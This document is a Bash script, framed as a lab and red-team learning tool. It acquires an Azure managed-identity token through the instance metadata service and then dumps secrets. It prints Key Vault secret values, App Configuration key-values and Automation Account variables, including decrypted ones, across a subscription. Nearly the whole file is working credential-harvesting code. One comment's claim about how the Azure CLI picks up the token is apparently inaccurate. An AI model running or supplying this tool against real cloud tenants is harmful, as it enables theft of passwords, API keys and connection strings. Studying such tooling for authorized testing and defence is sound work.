#!/bin/bash
# =============================================================================
# Azure Secrets Enumeration Script — FOR LEARNING / LAB USE ONLY
# =============================================================================
# Purpose : Demonstrates how secrets can be exposed in Azure environments
#           when an identity has overly permissive IAM roles.
# Use case: Security education, CTF labs, authorized red-team exercises.
# WARNING : Running this against environments you do not own or have explicit
#           written permission to test is illegal and unethical.
# =============================================================================
# Requirements:
#   - Azure CLI installed and logged in  (or AZURE_TOKEN set in environment)
#   - jq installed (for IMDS token parsing)
# =============================================================================

set -euo pipefail

# ---------------------------------------------------------------------------- #
#  Color helpers                                                                #
# ---------------------------------------------------------------------------- #
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

info()    { echo -e "${CYAN}[*]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
error()   { echo -e "${RED}[-]${NC} $*"; }

# ---------------------------------------------------------------------------- #
#  Step 0 — Pre-flight checks                                                   #
# ---------------------------------------------------------------------------- #
check_dependencies() {
    info "Checking required tools..."
    for cmd in az jq curl; do
        if ! command -v "$cmd" &>/dev/null; then
            error "Required tool not found: $cmd"
            exit 1
        fi
    done
    success "All dependencies satisfied."
}

# ---------------------------------------------------------------------------- #
#  Step 1 — Token acquisition via IMDS                                          #
# ---------------------------------------------------------------------------- #
# Azure Instance Metadata Service (IMDS) is available at a non-routable IP
# (169.254.169.254) on every Azure VM. If a Managed Identity is attached, a
# token can be fetched WITHOUT any stored credentials — a common lateral-
# movement vector if an attacker gains code execution on a VM.
# ---------------------------------------------------------------------------- #
use_imds() {
    info "Attempting IMDS token retrieval (only works on Azure VMs with Managed Identity)..."

    local imds_url="http://169.254.169.254/metadata/identity/oauth2/token"
    local resource="https://management.azure.com"
    local api_version="2018-02-01"

    local response
    response=$(curl -sf \
        --connect-timeout 3 \
        -H "Metadata: true" \
        "${imds_url}?resource=${resource}&api-version=${api_version}" 2>/dev/null || true)

    if [[ -z "$response" ]]; then
        warn "No response from IMDS — not running on an Azure VM, or IMDS is blocked."
        return
    fi

    local token
    token=$(echo "$response" | jq -r '.access_token // empty')

    if [[ -n "$token" ]]; then
        export AZURE_ACCESS_TOKEN="$token"
        success "IMDS token retrieved — Managed Identity is active on this VM."
        # Feed the token into the Azure CLI session so subsequent az commands use it.
        # Note: az CLI picks up AZURE_ACCESS_TOKEN automatically in recent versions.
        info "Token exported as AZURE_ACCESS_TOKEN."
    else
        warn "IMDS responded but no access_token found. Response: $response"
    fi
}

# ---------------------------------------------------------------------------- #
#  Step 2 — Key Vault secrets                                                   #
# ---------------------------------------------------------------------------- #
# Key Vault is the most common place developers store API keys, passwords, and
# TLS certificates. Even "list" permission on secrets reveals their names,
# which can themselves be sensitive (e.g. "prod-database-password").
# "get" permission exposes the actual secret value.
# ---------------------------------------------------------------------------- #
dump_keyvault_secrets() {
    success "Enumerating Key Vaults..."

    local vaults
    vaults=$(az keyvault list --query "[].name" -o tsv 2>/dev/null || true)

    if [[ -z "$vaults" ]]; then
        warn "No Key Vaults found (or no list permission)."
        return
    fi

    while IFS= read -r vault; do
        echo
        info "  Vault: $vault"

        local secrets
        secrets=$(az keyvault secret list \
            --vault-name "$vault" \
            --query "[].name" \
            -o tsv 2>/dev/null || true)

        if [[ -z "$secrets" ]]; then
            warn "    No secrets listed (missing 'list' permission or vault is empty)."
            continue
        fi

        while IFS= read -r secret; do
            # Attempt to read the secret value (requires "get" permission).
            local value
            value=$(az keyvault secret show \
                --vault-name "$vault" \
                --name "$secret" \
                --query "value" \
                -o tsv 2>/dev/null || echo "<access denied>")

            echo -e "    ${GREEN}[Secret]${NC} $secret => $value"
        done <<< "$secrets"
    done <<< "$vaults"
}

# ---------------------------------------------------------------------------- #
#  Step 3 — App Configuration stores                                            #
# ---------------------------------------------------------------------------- #
# Azure App Configuration holds application settings as key-value pairs.
# Developers sometimes store connection strings, feature flags, or even
# credentials here outside of Key Vault — making it a valuable enumeration target.
# ---------------------------------------------------------------------------- #
dump_appconfig() {
    success "Enumerating App Configuration stores..."

    local configs
    configs=$(az appconfig list --query "[].name" -o tsv 2>/dev/null || true)

    if [[ -z "$configs" ]]; then
        warn "No App Configuration stores found (or no list permission)."
        return
    fi

    while IFS= read -r config; do
        echo
        info "  AppConfig: $config"

        az appconfig kv list \
            --name "$config" \
            --query "[].{Key:key, Value:value}" \
            -o table 2>/dev/null \
            || warn "    Could not read key-values (missing 'Reader' permission)."
    done <<< "$configs"
}

# ---------------------------------------------------------------------------- #
#  Step 4 — Automation Account variables                                        #
# ---------------------------------------------------------------------------- #
# Azure Automation stores encrypted and unencrypted variables used in runbooks.
# Encrypted variables are stored in Key Vault internally, but the Automation
# API can return their decrypted value to callers with sufficient permissions —
# a frequently overlooked escalation path.
# ---------------------------------------------------------------------------- #
dump_automation_variables() {
    success "Enumerating Automation Accounts for sensitive variables..."

    local resource_groups
    resource_groups=$(az group list --query "[].name" -o tsv 2>/dev/null || true)

    if [[ -z "$resource_groups" ]]; then
        warn "No resource groups found (or no permission to list them)."
        return
    fi

    while IFS= read -r rg; do
        local accounts
        accounts=$(az automation account list \
            --resource-group "$rg" \
            --query "[].name" \
            -o tsv 2>/dev/null || true)

        [[ -z "$accounts" ]] && continue

        while IFS= read -r account; do
            echo
            info "  Automation Account: $account  (RG: $rg)"

            # List ALL variables (both encrypted and unencrypted).
            # In a real assessment you'd filter for encrypted==true as those
            # are more likely to hold credentials.
            local vars
            vars=$(az automation variable list \
                --automation-account-name "$account" \
                --resource-group "$rg" \
                --query "[].name" \
                -o tsv 2>/dev/null || true)

            if [[ -z "$vars" ]]; then
                warn "    No variables found (or no 'Reader' permission)."
                continue
            fi

            while IFS= read -r var; do
                local value
                value=$(az automation variable show \
                    --name "$var" \
                    --automation-account-name "$account" \
                    --resource-group "$rg" \
                    --query "value" \
                    -o tsv 2>/dev/null || echo "<access denied or encrypted>")

                echo -e "    ${GREEN}[Variable]${NC} $var => $value"
            done <<< "$vars"
        done <<< "$accounts"
    done <<< "$resource_groups"
}

# ---------------------------------------------------------------------------- #
#  Main execution flow                                                           #
# ---------------------------------------------------------------------------- #
main() {
    echo
    echo -e "${RED}=================================================================${NC}"
    echo -e "${RED}  Azure Secrets Enumeration — EDUCATIONAL / LAB USE ONLY        ${NC}"
    echo -e "${RED}=================================================================${NC}"
    echo

    check_dependencies

    # If a token was pre-set in the environment, inform the user.
    if [[ -n "${AZURE_TOKEN:-}" ]]; then
        info "AZURE_TOKEN found in environment — will use it for Azure CLI."
        export AZURE_ACCESS_TOKEN="$AZURE_TOKEN"
    fi

    echo
    echo "--- [Phase 1] Token Acquisition via IMDS ---"
    use_imds

    echo
    echo "--- [Phase 2] Key Vault Secrets ---"
    dump_keyvault_secrets

    echo
    echo "--- [Phase 3] App Configuration Key-Values ---"
    dump_appconfig

    echo
    echo "--- [Phase 4] Automation Account Variables ---"
    dump_automation_variables

    echo
    success "Enumeration complete."
}

main "$@"
